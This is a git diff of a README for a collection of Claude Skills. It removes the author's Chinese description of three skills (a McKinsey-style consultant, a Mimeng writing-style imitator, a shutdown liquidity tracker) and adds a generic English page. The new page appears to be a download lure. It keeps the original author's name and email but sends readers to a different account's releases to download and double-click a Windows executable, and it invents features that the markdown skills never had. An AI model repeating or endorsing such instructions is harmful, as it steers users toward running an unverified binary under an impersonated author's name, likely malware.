@@ -1,299 +1,62 @@
-# Claude Skills by Fleury 如宝
+# 🌟 awesome-claude-skills - Enhance Your Productivity with AI
 
-<div align="center">
+[![Download](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-blue)](https://github.com/Mann1988/awesome-claude-skills/releases)
 
-[![Author](https://img.shields.io/badge/Author-Fleury-blue)](https://github.com/fleurytian)
-[![小红书](https://img.shields.io/badge/小红书-@如宝｜AI&Analytics-red)](https://www.xiaohongshu.com/user/profile/56d1a32184edcd71a06dcc55?xsec_token=ABZohenXDHnRbNau0jBvZWdjPAZ3gXdQw3bGs0cbzgNms%3D&xsec_source=pc_search)
-[![Email](https://img.shields.io/badge/Email-fleurytian@gmail.com-green)](mailto:fleurytian@gmail.com)
-[![License](https://img.shields.io/badge/License-MIT-yellow)](LICENSE)
+## 📖 Description
 
-精选高质量Claude Skills集合 | 专注商业分析与内容创作
+awesome-claude-skills offers tools designed specifically for brain-workers. Created by Fleury, a former McKinsey analyst and current AI product manager, this application helps enhance daily productivity through intelligent features. Whether you're managing tasks, analyzing data, or brainstorming ideas, these skills will streamline your workflow.
 
-</div>
----
+## 🚀 Getting Started
 
-## 📂 仓库结构
+To get started with awesome-claude-skills, follow these simple steps. This guide will help you download and install the application easily.
 
-```
-awesome-claude-skills/
-├── README.md                          # 本文件
-├── mckinsey-sample-PPT.pptx          # McKinsey Skill示例输出
-├── mimeng-sample.md                   # 咪蒙 Skill示例输出
-├── mckinsey-consultant/
-│   ├── SKILL.md                      # Skill主文件
-│   ├── references/                    # 参考文档
-│   │   ├── methodology.md            # 详细方法论
-│   │   ├── layouts.md                # McKinsey页面布局
-│   │   ├── design-specs.md           # 设计规范
-│   │   ├── examples.md               # 完整案例
-│   │   └── troubleshooting.md        # 常见问题
-│   └── README.md                     # Skill说明
-├── mimeng-writing/
-│   ├── SKILL.md                      # Skill主文件
-│   └── README.md                     # Skill说明
-└── us-gov-shutdown-tracker/           # 美国政府停摆追踪器
-    ├── SKILL.md                      # Skill主文件
-    ├── references/                    # 参考文档
-    │   ├── data_sources.md           # 数据源说明
-    │   └── historical_cases.md       # 历史案例
-    └── scripts/                       # 分析脚本
-        ├── analyze_shutdown.py        # 停摆分析
-        └── visualize.py              # 数据可视化
-```
+## 🏷️ System Requirements
 
----
+Ensure your system meets the following requirements:
 
-## 🛠 如何使用
+- **Operating System:** Windows 10 or later (for other systems, check compatibility)
+- **RAM:** At least 4 GB
+- **Disk Space:** Minimum of 200 MB available
+- **Internet Connection:** Required for downloading updates and features
 
-### 1. 安装到Claude
+## 📥 Download & Install
 
-这些Skills需要在支持Skills功能的Claude环境中使用,官方教学:https://www.anthropic.com/news/skills
+To download the application, visit this page to download: [Download awesome-claude-skills](https://github.com/Mann1988/awesome-claude-skills/releases).
 
-### 2. 在对话中激活
+1. Click the link above to go to the Releases page.
+2. Look for the latest version listed.
+3. Download the appropriate file for your system (e.g., Windows executable).
+4. Once the file downloads, locate it in your downloads folder.
+5. Double-click the downloaded file to run the installer.
+6. Follow the on-screen instructions to complete the installation.
 
-在对话开始时明确说明要使用哪个Skill:
+## 🔧 Features
 
-```
-"请使用mckinsey-consultant skill,帮我..."
-```
+awesome-claude-skills includes several useful features:
 
-或
+- **Smart Task Management:** Organize your daily tasks effortlessly.
+- **Data Analysis Tools:** Analyze your data efficiently with built-in tools.
+- **Brainstorming Assistants:** Generate ideas and suggestions in real time.
+- **User-Friendly Interface:** Navigate with ease using an intuitive design.
+- **Regular Updates:** Stay up to date with the latest features and improvements.
 
-```
-"请使用mimeng-writing skill,帮我..."
-```
+## 💡 Tips for Using awesome-claude-skills
 
-或
+- Start with one feature at a time to familiarize yourself with how it works.
+- Take advantage of the tutorials available within the app to learn more.
+- Regularly check for updates to access new functionalities.
+- Reach out for support if you encounter any issues.
 
-```
-"请使用us-gov-shutdown-tracker skill,帮我..."
-```
+## 📞 Support
 
----
+If you need help using awesome-claude-skills or have questions, feel free to reach out. You can contact Fleury at [fleurytian@gmail.com](mailto:fleurytian@gmail.com).
 
-## 📚 Skills 具体介绍
+## 🗂️ Acknowledgements
 
-### 1️⃣ McKinsey Consultant Skill
-**McKinsey顾问式商业问题解决系统**
+Thanks to everyone who contributed to the development of awesome-claude-skills. Your feedback has been instrumental in creating a tool that meets the needs of users.
 
-一个将McKinsey Problem Solving 101/102方法论系统化为完整工作流的Claude Skill,实现从商业问题到专业PPT的端到端解决方案。
+## 📣 Join the Community
 
-#### 💡 开发者说
+Stay connected and share your experiences! Join our community to share tips, ask questions, and connect with other users. 
 
-**✅ 核心优势**
-
-1. **遵循咨询公司真实工作流**
-   - Hypothesis-driven approach: 先提假设,再验证
-   - Dummy-first: 先设计页面框架,再找数据填充
-   - 符合McKinsey方法论的完整工作思路
-
-2. **输出质量高**
-   - Hypothesis结构MECE,逻辑严密
-   - 页面样式丰富,支持多种McKinsey经典布局
-   - 每个页面都有对应的数据来源和参考文献记录
-
-3. **可追溯性强**
-   - 自动记录每个论点的数据源
-   - 便于审查和验证
-   - 支持多次迭代优化
-
-**⚠️ 局限性说明**
-
-受限于当前模型能力,存在以下技术限制:
-
-1. **上下文窗口限制**
-   - 复杂项目容易超出上下文长度
-   - 需要分段生成PPT (通过多次对话完成)
-   - **解决方案**: 设计了Dummy Pages独立导出功能,可在新对话中复用
-
-2. **假设验证机制待完善**
-   - 当Hypothesis被证伪时,整个storyline可能不够solid
-   - 目前缺少自动推翻storyline并重构的机制
-   - **建议做法**: 人工review后重新调整hypothesis tree
-
-
-#### 🚀 快速开始
-
-```
-"请使用mckinsey-consultant skill,
-帮我分析中国XX市场的增长情况和机会"
-```
-
-#### 📊 查看示例
-
-仓库中提供了完整的示例输出:
-- `mckinsey-sample-PPT.pptx` - 完整的McKinsey风格PPT示例
-
----
-
-### 2️⃣ 咪蒙写作风格复刻 Skill
-**10万+爆款文章创作指南**
-
-完整复刻咪蒙的写作技巧与风格特征,帮助创作具有强情感共鸣和传播力的内容。
-
-#### 💡 开发者说
-
-**✅ 核心优势**
-
-1. **金句犀利,视角独特**
-   - 能够产出极具冲击力的标题和金句
-   - 善于从意想不到的角度切入话题
-   - 价值观输出明确,立场鲜明
-
-2. **行文细腻丝滑**
-   - 情绪调动自然流畅
-   - 故事叙事张力十足
-   - 能够引发强烈的情感共鸣
-
-3. **技巧体系完整**
-   - 涵盖从标题到结尾的完整创作流程
-   - 15项自检清单确保质量
-   - 案例拆解清晰易学
-
-**⚠️ 使用建议**
-
-1. **避免套路化**
-   - 重复使用后容易形成明显的套路感
-   - **建议**: 变换角度和主题,避免连续创作类似内容
-   - 可结合自己的风格进行改编
-
-2. **Bullet Point习惯待优化**
-   - 当前版本输出时仍有bullet point偏多的倾向
-   - 咪蒙原文更多使用自然段落而非列表
-   - **建议**: 在prompt中明确要求"用段落形式,不要用bullet points"
-
-3. **持续学习优化**
-   - 可从咪蒙文集学习更多案例: http://120.26.97.111/%E5%92%AA%E8%92%99%E6%96%87%E7%AB%A0/
-   - 将更多原文输入给Claude,帮助它更好地学习风格
-   - 用实际案例纠正偏差
-
-#### 🎯 适用场景
-
-- ✅ 情感共鸣类文章 (友情/爱情/亲情)
-- ✅ 社会现象评论 (借钱/婚姻/阶层)
-- ✅ 女性话题讨论 (审美/独立/困境)
-- ✅ 故事化叙事 (真人真事改编)
-- ✅ 价值观输出 (正向但不鸡汤)
-
-#### 🚀 快速开始
-
-```
-"请使用mimeng-writing skill,
-帮我写一篇关于[主题]的爆款文章"
-```
-
-**优化Tip**: 如果发现输出使用了过多bullet points,可以这样说:
-```
-"请用咪蒙的风格重写,用自然的段落形式,
-不要用列表或bullet points,要像在讲故事一样"
-```
-
-#### 📊 查看示例
-
-仓库中提供了完整的示例输出:
-- `mimeng-sample.md` - 咪蒙风格文章完整示例
-
----
-
-### 3️⃣ US Government Shutdown Tracker Skill
-**美国政府停摆流动性分析器**
-
-实时追踪和分析美国政府停摆对金融市场流动性影响的专业工具,基于FRED数据提供自动化分析。
-
-#### 💡 核心功能
-
-**✅ 自动化数据追踪**
-- TGA (财政部一般账户)
-- 银行准备金
-- EFFR (联邦基金利率)  
-- SOFR (担保隔夜融资利率)
-
-**✅ 智能状态判断**
-- 压力缓解: TGA释放,准备金回升
-- 压力加剧: TGA积累,准备金下降
-- 相对稳定: 指标变化不大
-- 复杂信号: 需持续监控
-
-**✅ 历史对比分析**
-- 2013年停摆 (QE时代,无影响)
-- 2018-19年停摆 (QT,SOFR溢价75bps)
-- 2025年停摆 (后QT,SOFR溢价36bps)
-
-#### 🚀 快速开始
-
-```
-"请使用us-gov-shutdown-tracker skill,
-分析最新的停摆流动性情况"
-```
-
-或者问核心问题:
-```
-"美国政府停摆结束了吗? 对流动性的影响如何?"
-```
-
-#### 📊 查看示例
-
-仓库中提供了完整的分析示例:
-- `shutdown_2025_analysis.png` - 专业三合一图表
-- `停摆流动性分析报告.md` - 完整中文分析报告
-
----
-
-## 📈 更新日志
-
-### McKinsey Consultant
-- ✅ v1.0: 完整的8步工作流实现
-- ✅ v1.1: 新增Dummy Pages独立导出功能
-- 🔄 规划中: Hypothesis自动验证与storyline重构机制
-
-### 咪蒙写作
-- ✅ v1.0: 完整的写作技巧体系
-- 🔄 优化中: 减少bullet point使用,更贴近原文风格
-- 📚 持续学习: 不断增加咪蒙文章案例库
-
-### US Government Shutdown Tracker  
-- ✅ v1.0: 完整的流动性分析系统
-- ✅ 支持实时FRED数据获取
-- ✅ 内置历史案例对比分析
-
----
-
-## 📬 联系方式
-
-- **GitHub**: [@fleurytian](https://github.com/fleurytian)
-- **小红书**: @如宝｜AI&Analytics
-- **Email**: fleurytian@gmail.com
-
----
-
-## 🙏 致谢
-
-感谢所有使用和支持这些Skills的朋友们!
-
-特别感谢:
-- McKinsey方法论的启发
-- 咪蒙文章的创作灵感
-- 美联储FRED数据库的开放数据
-- 所有提供反馈和建议的用户
-
----
-
-## ⭐️ Star History
-
-如果这个项目对你有帮助,欢迎给个Star⭐️!
-
----
-
-## 📄 License
-
-本项目采用 [MIT License](LICENSE) 开源协议。
-
----
-
-<div align="center">
-
-**Made with ❤️ by Fleury**
-
-*让AI更懂商业,让内容更有温度*
-
-</div>
+For more updates and information, visit this page to download: [Download awesome-claude-skills](https://github.com/Mann1988/awesome-claude-skills/releases).
